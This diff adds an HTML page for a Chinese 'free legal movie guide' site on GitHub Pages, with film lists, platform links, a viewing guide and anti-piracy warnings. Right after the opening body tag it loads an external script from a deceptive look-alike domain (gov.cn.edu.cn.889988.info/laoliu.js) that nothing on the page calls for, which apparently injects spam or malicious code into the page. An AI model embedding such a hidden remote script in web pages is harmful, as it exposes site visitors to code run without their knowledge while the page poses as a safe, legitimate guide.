@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费在线观看电影网 - 正版电影片单与观影导航</title>
+<meta name="description" content="免费在线观看电影网整理可免费/正版观看的电影片单、平台入口、观影指南与盗版避雷提示，手机端自适应，不提供侵权资源。">
+<meta name="keywords" content="免费在线观看电影网,正版电影,免费电影片单,在线观看,观影指南,影视导航">
+<meta name="author" content="免费在线观看电影网">
+<link rel="canonical" href="https://mianfeizaixianguankandianyingwang-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#070b1e;color:#e7ecff;line-height:1.75;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{position:sticky;top:0;z-index:99;background:rgba(7,11,30,.85);backdrop-filter:blur(10px);border-bottom:1px solid #1c2750}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;font-size:1.2rem;background:linear-gradient(90deg,#7c9bff,#c66bff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.88rem;color:#9fb0e8}
+.nav__links a:hover{background:#172046;color:#fff}
+
+/* Hero */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:28px;overflow:hidden;background:
+  radial-gradient(circle at 85% 10%,rgba(198,107,255,.35),transparent 55%),
+  linear-gradient(135deg,#0b1230,#241a52 55%,#3a1d6e);
+  display:grid;grid-template-columns:1.25fr .75fr}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.75rem;letter-spacing:2px;color:#c66bff;border:1px solid #5a3fa0;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:1rem}
+.hero h1 em{font-style:normal;color:#7c9bff}
+.hero p{color:#b9c4ee;max-width:540px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:linear-gradient(135deg,#7c9bff,#c66bff);color:#0b1230;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:7rem;filter:drop-shadow(0 10px 30px rgba(124,155,255,.4))}
+
+/* 通用 */
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem}
+.head h2 span{color:#c66bff}
+.head a{margin-left:auto;color:#9fb0e8;font-size:.85rem}
+
+/* 栏目1：免费正版片单——玻璃卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.glass{background:rgba(23,32,70,.7);border:1px solid #28336b;border-radius:18px;padding:1.2rem;backdrop-filter:blur(6px);transition:.3s}
+.glass:hover{transform:translateY(-6px);border-color:#7c9bff;box-shadow:0 18px 40px rgba(124,155,255,.18)}
+.glass__ic{font-size:2.2rem;margin-bottom:.6rem}
+.glass h3{font-size:1.02rem;margin-bottom:.3rem}
+.glass p{font-size:.84rem;color:#aab6e6}
+
+/* 栏目2：平台导航——左大卡+右列表 */
+.platform{display:grid;grid-template-columns:1.1fr .9fr;gap:1.5rem}
+.pl-hero{border-radius:20px;min-height:380px;color:#fff;position:relative;overflow:hidden;display:flex;align-items:flex-end;padding:2rem;background:linear-gradient(135deg,#241a52,#3a1d6e)}
+.pl-hero h3{font-size:1.7rem;margin-bottom:.4rem}
+.pl-hero p{color:rgba(255,255,255,.82)}
+.pl-list{display:flex;flex-direction:column;gap:.8rem}
+.pl-row{display:flex;align-items:center;gap:.9rem;background:rgba(23,32,70,.7);border:1px solid #28336b;border-radius:14px;padding:.8rem .9rem}
+.pl-row__dot{width:42px;height:42px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex:none}
+.pl-row h4{font-size:.95rem}
+.pl-row small{color:#aab6e6}
+.pl-row em{margin-left:auto;font-style:normal;color:#7c9bff;font-weight:700;font-size:.78rem}
+
+/* 栏目3：类型墙——标签云 */
+.tags{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.7rem 1.1rem;border-radius:14px;font-weight:600;color:#fff;background:rgba(23,32,70,.8);border:1px solid #28336b}
+.chip small{display:block;font-weight:400;opacity:.8;font-size:.74rem}
+
+/* 栏目4：观影指南——步骤时间轴 */
+.guide{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:rgba(23,32,70,.7);border:1px solid #28336b;border-radius:18px;padding:1.3rem;position:relative}
+.step__no{font-size:2rem;font-weight:900;color:#c66bff}
+.step h4{margin:.3rem 0;font-size:1.02rem}
+.step p{font-size:.86rem;color:#b9c4ee}
+
+/* 栏目5：避雷提示——警告卡 */
+.warn{background:rgba(60,20,40,.6);border:1px solid #7a2f4d;border-radius:18px;padding:1.4rem 1.6rem}
+.warn h3{color:#ff9bb3;margin-bottom:.6rem}
+.warn ul{margin-left:1.2rem;color:#e7c4d0;font-size:.9rem}
+.warn li{margin:.3rem 0}
+
+/* 页脚 */
+.foot{margin-top:4rem;background:#04061a;color:#9fb0e8;text-align:center;padding:2.5rem 1rem;border-top:1px solid #1c2750}
+.foot b{color:#fff}
+.foot a{color:#7c9bff;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#6776ad}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:150px;font-size:4.5rem}
+  .platform{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">免费在线观看电影网</div>
+    <nav class="nav__links">
+      <a href="#list">免费片单</a>
+      <a href="#platform">正版平台</a>
+      <a href="#type">类型导航</a>
+      <a href="#guide">观影指南</a>
+      <a href="#safe">防盗版</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">FREE & LEGAL MOVIE GUIDE</span>
+      <h1>免费在线观看电影网<br><em>正版片单 · 平台导航 · 观影不踩坑</em></h1>
+      <p>免费在线观看电影网只做合规内容：整理可免费/正版观看的电影、动画与纪录片，推荐正规平台，提示盗版风险，不提供侵权播放地址。</p>
+      <a href="#list" class="hero__btn">查看片单 ›</a>
+    </div>
+    <div class="hero__right">🎬</div>
+  </div>
+</section>
+
+<section class="wrap" id="list">
+  <div class="head"><h2>可免费/正版<span>电影片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="glass"><div class="glass__ic">🎞️</div><h3>公版老电影合集</h3><p>1920s-1950s 公版胶片，正规档案馆可看</p></article>
+    <article class="glass"><div class="glass__ic">📽️</div><h3>平台限免文艺片</h3><p>流媒体月度限免、首月优惠片单</p></article>
+    <article class="glass"><div class="glass__ic">🧒</div><h3>合家欢动画</h3><p>亲子向、教育向动画整理</p></article>
+    <article class="glass"><div class="glass__ic">📼</div><h3>纪录片片单</h3><p>自然、历史、科技类正版纪录片</p></article>
+    <article class="glass"><div class="glass__ic">🎭</div><h3>经典喜剧重温</h3><p>卓别林、成龙、周星驰正版片源</p></article>
+    <article class="glass"><div class="glass__ic">🌌</div><h3>科幻入门片单</h3><p>从《2001太空漫游》到现代硬科幻</p></article>
+  </div>
+</section>
+
+<section class="wrap" id="platform">
+  <div class="head"><h2>正版<span>观看平台</span></h2><a href="#">更多 ›</a></div>
+  <div class="platform">
+    <article class="pl-hero">
+      <div>
+        <h3>走正版，才叫“免费在线观看”</h3>
+        <p>正规平台有广告版、会员试用、公版片库、教育授权；比来路不明播放器安全得多。</p>
+      </div>
+    </article>
+    <div class="pl-list">
+      <div class="pl-row"><div class="pl-row__dot" style="background:#7c9bff">🅰️</div><div><h4>主流视频平台-免费层</h4><small>广告支持 / 部分限免</small></div><em>合规</em></div>
+      <div class="pl-row"><div class="pl-row__dot" style="background:#c66bff">🎓</div><div><h4>公共视听/文化机构</h4><small>公版电影 / 纪录片</small></div><em>免费</em></div>
+      <div class="pl-row"><div class="pl-row__dot" style="background:#5ad1c2">📺</div><div><h4>电视台回看/官方APP</h4><small>正版授权 / 限时回放</small></div><em>正规</em></div>
+      <div class="pl-row"><div class="pl-row__dot" style="background:#ffb86b">🎟️</div><div><h4>流媒体首月试用</h4><small>记得到期前取消</small></div><em>注意</em></div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="type">
+  <div class="head"><h2>按类型<span>找电影</span></h2><a href="#">更多 ›</a></div>
+  <div class="tags">
+    <div class="chip" style="background:linear-gradient(135deg,#241a52,#3a1d6e)">爱情<small>纯爱/婚后/异地</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#0b1230,#244a8a)">悬疑<small>推理/惊悚/犯罪</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#3a1d6e,#7c3bff)">科幻<small>太空/AI/时间</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#06403a,#1f9e8a)">自然纪录片<small>动物/海洋/极地</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#3a2410,#c0843b)">历史剧情<small>战争/王朝/传记</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#2a1030,#ff6b9d)">动画<small>国漫/合家欢/治愈</small></div>
+    <div class="chip" style="background:linear-gradient(135deg,#101030,#5a6bff)">喜剧<small>黑色/温情/闹剧</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="guide">
+  <div class="head"><h2>新手<span>观影指南</span></h2><a href="#">更多 ›</a></div>
+  <div class="guide">
+    <div class="step"><div class="step__no">01</div><h4>先定类型</h4><p>想放松看喜剧，想动脑看悬疑，别用“免费”代替“想看什么”。</p></div>
+    <div class="step"><div class="step__no">02</div><h4>认准正版</h4><p>官方APP、电视台、公共文化平台、知名流媒体，优于无名聚合站。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>不装播放器</h4><p>弹窗要求装“专用播放器/破解版APP”的页面，基本都有风险。</p></div>
+    <div class="step"><div class="step__no">04</div><h4>看公版片</h4><p>公版电影、纪录片、老动画是“真免费”，版权清晰、平台敢放。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="safe">
+  <div class="head"><h2>防盗版<span>避雷提示</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>⚠️ 这些“免费在线观看”别信</h3>
+    <ul>
+      <li>刚上映院线大片，小站就能“高清完整版”→ 多为侵权/录屏/诈骗</li>
+      <li>要求关闭杀毒、安装 APK/EXE、输入手机号 → 高危</li>
+      <li>“永久VIP/网盘解压码/加群拿资源” → 灰产引流</li>
+      <li>页面满屏“立即播放”却不断跳广告 → 恶意变现</li>
+      <li>GitHub Pages 聚合盗版视频/网盘 → 违反平台政策，易被下架 </li>
+    </ul>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>免费在线观看电影网</b> · 正版片单 / 平台导航 / 观影指南 / 防盗版</div>
+  <div style="margin-top:.6rem">
+    <a href="#list">免费片单</a>|
+    <a href="#platform">正版平台</a>|
+    <a href="#type">类型导航</a>|
+    <a href="#guide">观影指南</a>|
+    <a href="#safe">防盗版</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://mianfeizaixianguankandianyingwang-h5.github.io</small>
+  <small>© 2025 免费在线观看电影网 仅做影视文化与正版导航，不提供侵权影视资源</small>
+</footer>
+
+</body>
+</html>
